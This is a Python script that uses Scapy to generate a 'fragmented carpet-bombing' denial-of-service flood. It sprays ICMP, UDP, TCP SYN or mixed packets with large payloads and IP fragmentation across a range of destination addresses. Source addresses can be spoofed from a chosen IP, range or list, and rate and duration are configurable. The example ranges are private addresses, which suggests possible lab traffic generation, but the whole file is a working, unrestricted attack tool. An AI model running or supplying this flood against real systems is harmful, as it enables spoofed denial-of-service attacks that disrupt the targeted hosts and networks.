"""Generate fragmented carpet-bombing traffic with Scapy.

Change log:
- 2026-05-28 00:31:18 EDT: Initial fragmented carpet-bombing generator added.
"""

from __future__ import annotations

import argparse
import ipaddress
import random
import time

from scapy.all import ICMP, IP, TCP, UDP, Raw, fragment, send  # type: ignore


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Fragmented carpet-bombing generator.")
    parser.add_argument("--dst-range", required=True, help="Destination IP range, ex: 10.0.0.20-10.0.0.40")
    src_group = parser.add_mutually_exclusive_group(required=True)
    src_group.add_argument("--src-ip", help="Single source IP for crafted packets")
    src_group.add_argument("--src-range", help="Source IP range, ex: 10.0.0.100-10.0.0.120")
    src_group.add_argument(
        "--src-ips",
        help="Comma-separated source IPs, ex: 10.0.0.11,10.0.0.12,10.0.0.13",
    )
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--pps", type=int, default=200, help="Approx packets-per-second before fragmentation")
    parser.add_argument("--protocol", choices=["icmp", "udp", "tcp_syn", "mixed"], default="udp")
    parser.add_argument("--fragsize", type=int, default=200, help="IP fragment size")
    parser.add_argument(
        "--fragment-mode",
        choices=["manual", "auto"],
        default="manual",
        help="manual=Scapy fragment() before send, auto=send packet as-is and rely on IP stack/path",
    )
    parser.add_argument("--payload-size", type=int, default=4000, help="Raw payload size in bytes")
    parser.add_argument(
        "--tcp-ports",
        nargs="+",
        type=int,
        default=[80, 443, 8080],
        help="TCP destination ports used for tcp_syn/mixed modes",
    )
    parser.add_argument(
        "--udp-ports",
        nargs="+",
        type=int,
        default=[53, 123, 5000],
        help="UDP destination ports used for udp/mixed modes",
    )
    return parser.parse_args()


def iter_range(range_raw: str) -> list[str]:
    start_s, end_s = range_raw.split("-", 1)
    start = int(ipaddress.ip_address(start_s.strip()))
    end = int(ipaddress.ip_address(end_s.strip()))
    if start > end:
        raise ValueError("Invalid destination range: start > end")
    return [str(ipaddress.ip_address(v)) for v in range(start, end + 1)]


def parse_src_ips(args: argparse.Namespace) -> list[str]:
    if args.src_ip:
        return [str(ipaddress.ip_address(args.src_ip.strip()))]
    if args.src_range:
        return iter_range(args.src_range)
    if args.src_ips:
        parts = [p.strip() for p in args.src_ips.split(",") if p.strip()]
        if not parts:
            raise ValueError("--src-ips cannot be empty")
        return [str(ipaddress.ip_address(p)) for p in parts]
    raise ValueError("Provide one of --src-ip, --src-range, or --src-ips")


def build_packet(
    src_ip: str,
    dst_ip: str,
    proto: str,
    payload_size: int,
    tcp_ports: list[int],
    udp_ports: list[int],
):
    payload = Raw(b"A" * payload_size)
    if proto == "icmp":
        return IP(src=src_ip, dst=dst_ip) / ICMP() / payload
    if proto == "udp":
        return IP(src=src_ip, dst=dst_ip) / UDP(
            sport=random.randint(1024, 65535), dport=random.choice(udp_ports)
        ) / payload
    if proto == "tcp_syn":
        return IP(src=src_ip, dst=dst_ip) / TCP(
            sport=random.randint(1024, 65535), dport=random.choice(tcp_ports), flags="S"
        ) / payload
    selected = random.choice(["icmp", "udp", "tcp_syn"])
    return build_packet(src_ip, dst_ip, selected, payload_size, tcp_ports, udp_ports)


def run_attack(args: argparse.Namespace) -> None:
    src_ips = parse_src_ips(args)
    dest_ips = iter_range(args.dst_range)
    sleep_interval = 1.0 / max(args.pps, 1)
    end_time = time.time() + args.duration

    while time.time() < end_time:
        src_ip = random.choice(src_ips)
        dst_ip = random.choice(dest_ips)
        pkt = build_packet(
            src_ip=src_ip,
            dst_ip=dst_ip,
            proto=args.protocol,
            payload_size=args.payload_size,
            tcp_ports=args.tcp_ports,
            udp_ports=args.udp_ports,
        )
        if args.fragment_mode == "manual":
            frags = fragment(pkt, fragsize=args.fragsize)
            send(frags, verbose=False)
        else:
            send(pkt, verbose=False)
        time.sleep(sleep_interval)


def main() -> int:
    args = parse_args()
    run_attack(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
